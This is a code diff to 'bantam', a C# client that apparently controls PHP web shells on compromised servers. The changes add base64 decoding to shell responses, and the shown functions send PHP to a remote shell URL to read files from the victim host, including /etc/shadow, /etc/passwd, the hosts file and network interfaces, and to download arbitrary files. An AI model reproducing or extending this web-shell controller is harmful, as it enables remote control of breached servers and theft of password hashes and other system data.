@@ -146,12 +146,17 @@ namespace bantam
         /// <param name="ResponseEncryptionMode"></param>
         /// <param name="richTextBox"></param>
         /// <param name="prependText"></param>
-        public static async Task ExecutePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int ResponseEncryptionMode, RichTextBox richTextBox = null, string prependText = "")
+        public static async Task ExecutePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int ResponseEncryptionMode, bool base64DecodeResponse = false, RichTextBox richTextBox = null, string prependText = "")
         {
             //todo this doesn't have a timeout
             string result = await ExecutePHPCode(url, phpCode, encryptResponse, ResponseEncryptionMode);
 
             if (string.IsNullOrEmpty(result) == false) {
+
+                if (base64DecodeResponse) {
+                    result = Helper.EncodeBase64ToString(result);
+                }
+
                 result = result.Replace(PhpBuilder.rowSeperator, "\r\n");
 
                 if (!string.IsNullOrEmpty(prependText)) {
@@ -380,6 +385,10 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFileFromVar(PhpBuilder.phpServerScriptFileName, encryptResponse);
             string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
+
+            if (!string.IsNullOrEmpty(result)) {
+                result = Helper.DecodeBase64ToString(result);
+            }
 
             UploadFile u = new UploadFile(shellUrl, result, true);
             u.ShowDialog();
@@ -1146,7 +1155,7 @@ namespace bantam
             string name = fileBrowserGetFileNameAndPath();
             string phpCode = PhpBuilder.ReadFile(name, encrypt);
         
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1305,9 +1314,7 @@ namespace bantam
 
             if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
                 if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
-                    //todo move phpcode
-                    //todo doesnt look like it will work without encryption?
-                    string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
+                    string phpCode = PhpBuilder.ReadFile(fileName, encryptResponse);
                     string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode).ConfigureAwait(false);
                     if (string.IsNullOrEmpty(result) == false) {
                         byte[] fileBytes = Helper.DecodeBase64(result);
@@ -1482,7 +1489,7 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.windowsFS_hostTargets, encryptResponse);
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.windowsFS_hostTargets, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.windowsFS_hostTargets, encryptResponse, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1498,7 +1505,7 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse);
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1514,7 +1521,7 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.linuxFS_ProcVersion, encryptResponse);
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ProcVersion, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ProcVersion, encryptResponse, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1530,7 +1537,7 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.linuxFS_hostTargetsFile, encryptResponse);
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_hostTargetsFile, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_hostTargetsFile, encryptResponse, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1546,7 +1553,7 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.linuxFS_IssueFile, encryptResponse);
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_IssueFile, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_IssueFile, encryptResponse, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1562,7 +1569,7 @@ namespace bantam
 
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.linuxFS_ShadowFile, encryptResponse);
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ShadowFile, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ShadowFile, encryptResponse, ResponseEncryptionMode, true);
         }
 
         /// <summary>
@@ -1577,7 +1584,7 @@ namespace bantam
             string phpCode = PhpBuilder.ReadFile(PhpBuilder.linuxFS_PasswdFile, Shells[shellUrl].ResponseEncryption);
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
 
-            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_PasswdFile, encryptResponse, ResponseEncryptionMode);
+            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_PasswdFile, encryptResponse, ResponseEncryptionMode, true);
         }
 
         #endregion
